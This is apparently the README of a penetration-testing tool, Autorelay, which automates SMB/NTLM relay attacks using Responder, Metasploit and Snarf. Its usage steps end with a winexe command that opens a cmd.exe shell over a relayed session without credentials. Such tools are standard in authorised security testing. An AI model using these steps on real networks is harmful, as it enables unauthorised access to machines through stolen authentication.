# Autorelay

Automatically performs the SMB relay attack. Uses Responder to poison, Metasploit for HTTP NTLM relay (rather than just SMB relay), and Snarf for the MITM'ing. 


## Usage

1. pip install -r requirements

2. python autoresp.py -i [interface] -x [nmap xml file]

3. Point your browser to http://localhost:4001 and refresh it periodically to see your MITM'd connections

4. After a connection is expired (or you expire it), click "choose"

5. On the remote device run: winexe //127.0.0.1 -U "a%a" cmd.exe

6. If your SMB connection had admin rights, you now have a shell without any credentials.
